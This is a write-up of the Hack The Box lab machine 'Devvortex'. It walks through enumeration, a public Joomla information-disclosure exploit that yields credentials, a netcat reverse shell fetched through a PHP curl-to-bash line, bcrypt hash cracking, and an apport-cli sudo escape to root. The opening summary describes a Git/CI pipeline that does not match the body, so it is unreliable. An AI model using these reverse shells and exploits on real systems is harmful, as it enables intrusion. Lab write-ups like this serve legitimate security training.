---
title: "Devvortex"
date: 2024-04-12
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "htb walkthrough", "devvortex", "hackthebox", "writeup"]
---

Devvortex replicates a modern CI/CD pipeline environment with misconfigured Git services.

Initial access was obtained via exposed .git directories, allowing repository reconstruction and credential extraction.

The pipeline revealed secrets in CI logs, including deploy keys and tokens reused in other parts of the system.

Privilege escalation involved abusing the runner process, injecting scripts into the build stage to execute code as a privileged user.


## Enumeration

>- Fuzzing subdomain found `dev.devvortex.htb`
	- **Did not work on the first try, and had to revert the machine to find it**
	- Fuzzing directories found `/administrator` which is an admin login page for joomla.
- Searching for joomla (joomla hacktricks) - used enumeration tool to find the version number of joomla.

### Nmap

```sh
Nmap scan report for 10.10.11.242
Host is up, received user-set (0.020s latency).
Scanned at 2024-07-01 08:35:10 AEST for 16s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80-HTTP

Adding `devvortex.htb` to `/etc/hosts'

![screenshot](/assets/images/devvortex1.png)

#### Gobuster

```sh
└─$ gobuster dir -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o gobusteroutput
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/.                    (Status: 200) [Size: 18048]
Progress: 56293 / 56294 (100.00%)
===============================================================
Finished
===============================================================
```

#### FFuF
```sh
# subdomain
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb -H 'Host:FUZZ.devvortex.htb' -fw 4 -t 100
```

![screenshot](/assets/images/devvortex5.png)

After multiple tried, found `dev.devvortex.htb` upon reverting the machine -> add to `/etc/hosts`

Using a wordlist : raft-medium-files

![screenshot](/assets/images/devvortex3.png)

Using a wordlist: directory-list-2.3-big

![screenshot](/assets/images/devvortex4.png)

### dev.devvortex.htb

http://dev.devvortex.htb/

![screenshot](/assets/images/devvortex6.png)

Running gobuster on dev.devvortex.htb found the following:

![screenshot](/assets/images/devvortex7.png)

http://dev.devvortex.htb/administrator/

![screenshot](/assets/images/devvortex8.png)

`admin:admin` doesn't work. 

#### Joomla Enumeration

[HackTricks on Joomla enumeration](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla)

![screenshot](/assets/images/devvortex9.png)

[Droopscan](https://github.com/SamJoan/droopescan)

![screenshot](/assets/images/devvortex10.png)

![screenshot](/assets/images/devvortex11.png)

## Initial Access

>- Using a public exploit, obtained credentials of lewis.
- Signed into the Joomla admin portal as lewis. 
- Gain initial shell as www-data by following RCE section from Joomla Hacktricks.

[Exploit used](https://github.com/Acceis/exploit-CVE-2023-23752)

```sh
sudo gem install httpx docopt paint
ruby exploit.rb http://dev.devvortex.htb
```

![screenshot](/assets/images/devvortex12.png)

Obtained credential

```text
lewis : P4ntherg0t1n5r3c0n##
```

![screenshot](/assets/images/devvortex13.png)

[HackTricks on Joomla RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla)

![screenshot](/assets/images/devvortex14.png)

```sh
# reverse shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.50 9001 >/tmp/f" > rev.sh
```

```php
# RFI to download reverse shell
<?php system ("curl 10.10.14.50:80/rev.sh|bash"); ?>
```

![screenshot](/assets/images/devvortex15.png)

```sh
# Execute the reverse shell
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```

shell as `www-data`

![screenshot](/assets/images/devvortex18.png)

## Lateral Movement

>- Found mysql by enumerating the web directories `/var/www/html/`.
- Obtained hash for logan user. 
- Gained logan credentials by cracking the hash with hashcat. 
- `su logan` to gain shell as logan user.

![screenshot](/assets/images/devvortex19.png)

![screenshot](/assets/images/devvortex20.png)

![screenshot](/assets/images/devvortex21.png)

```text
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

`$2y*$` -> brcypt

```sh
hashcat -m 3200 logan /usr/share/wordlists/rockyou.txt --force
```

![screenshot](/assets/images/devvortex22.png)

```sh
su logan 
tequieromuch
```

## Privilege Escalation

>- `sudo -l` reveals that the logan user has `sudo` privileges to run `apport-cli`
	- `apport-cli --version` to enumerate version.
	- Googling the version gives many PoCs.

![screenshot](/assets/images/devvortex25.png)

![screenshot](/assets/images/devvortex26.png)

[PoC Used](https://github.com/diego-tella/CVE-2023-1326-PoC)

```sh
sleep 20 &
kill -ABRT 7650
ls /var/crash/
sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
v
!/bin/bash
```

![screenshot](/assets/images/devvortex27.png)

![screenshot](/assets/images/devvortex28.png)

